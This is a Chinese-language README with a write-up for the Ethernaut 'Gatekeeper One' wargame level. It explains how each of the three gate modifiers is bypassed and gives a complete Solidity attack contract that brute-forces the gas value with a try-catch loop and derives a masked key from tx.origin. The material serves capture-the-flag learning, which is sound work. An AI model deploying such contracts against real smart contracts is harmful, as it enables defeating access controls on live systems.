# Ethernaut-Gatekeeper-One
Ethernaut Gatekeeper One解題思路

<img width="1870" height="1020" alt="image" src="https://github.com/user-attachments/assets/9ba3df40-bd34-4503-b38c-b05aca450a54" />

***主要是要破解modifier***

第一個modifier：建立一個合約讓他呼叫GatekeeperOne合約就可以了

第二個modifier：要讓gasleft()是8191的倍數，這邊我用的是用for迴圈再搭配try-catch從1加到8191，如果有符合就跳出，沒有的話就繼續執行下去。

第三個modifier：比較複雜一點：

    bytes8 key = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;

0xFFFFFFFF0000FFFF是一個遮罩，作用是把中間那兩個 bytes 清成 0，只保留前 4 bytes + 後 2 bytes。

故整個程式碼：

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface IGatekeeperOne{
        function enter(bytes8 _gatekey)external returns (bool);
    }

    contract HackIt {

        function sendItNow(IGatekeeperOne gate) public {
        bytes8 key = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i <= 8191; i++) {
            try gate.enter{gas: 1000000 + i}(key) {
                break;
            } 
            catch {

            }
        }
    }
    }

gate.enter{gas: 1000000 + i}(key)，因為我有建立interface，所以可以用gate去呼叫enter這個function，並且利用calldata的方式去傳入key值。

這樣就可以完成關卡摟！！！

